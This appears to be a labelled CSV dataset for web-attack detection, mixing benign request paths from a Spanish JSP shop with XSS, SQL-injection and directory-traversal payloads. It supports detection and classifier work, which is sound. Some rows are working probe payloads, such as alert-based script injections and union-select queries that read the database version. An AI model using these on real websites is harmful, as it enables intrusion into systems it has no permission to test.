payload,type
imagenes/3.gif,normal
index.jsp,normal
imagenes/nuestratierra.jpg,normal
global/estilos.css,normal
publico/registro.jsp?modo=registro&login=chunshin&password=GrajA&nombre=Jan&apellidos=Sp%EDnola+Ballado&email=bannerman%40nevadahispanica.aq&dni=40979614P&direccion=Ferrer+Del+Rio%2C+126+2%3FH&ciudad=Corull%F3n&cp=32170&provincia=Cantabria&ntc=8975421069079015&B1=Registrar,normal
imagenes/logo.gif,normal
imagenes/logo.gif,normal
"<a style=""pointer-events:none;position:absolute;""><a style=""position:absolute;"" onclick=""javascript:alert(1);"">XXX</a></a><a href=""javascript:javascript:alert(1)"">XXX</a>",xss
miembros/imagenes/ogono.jpg,normal
imagenes/2.gif,normal
imagenes/2.gif,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
miembros/salir.jsp,normal
"&onUE: select * from users where id=1 or \<$ union select 1,@@VERSION -- 1",sqli
global/menum.jsp,normal
miembros/salir.jsp,normal
"""/><img/onerror=\x27javascript:alert(1)\x27src=xxx:x />",xss
"""`'><script>\xC2\x85javascript:alert(1)</script>",xss
<img SRC='vbscript:document.vulnerable=true;'>,xss
miembros/fotos.jsp,normal
publico/autenticar.jsp?modo=entrar&login=jasmann&pwd=Co4si35a&remember=on&B1=Entrar,normal
%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\{FILE},traversal
publico/miembros.jsp,normal
<img src=xss onerror=alert(1)>,xss
<input onfocus=write(XSS) autofocus>,xss
<IMG SRC=jAVasCrIPt:alert(‘XSS’)>,xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
"exp/*&lt;A STYLE='no\xss&#58;noxss(\""*//*\"");",xss
"<a href=""javascript:void(0)"" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>",xss
publico/vaciar.jsp?B2=Vaciar+carrito,normal
...\{FILE},traversal
"1UE1k: select * from users where id=1 +1 union select 1,banner from v$version where rownum=1 -- 1",sqli
miembros/fotos.jsp,normal
imagenes/2.gif,normal
publico/productos.jsp,normal
miembros/fotos.jsp,normal
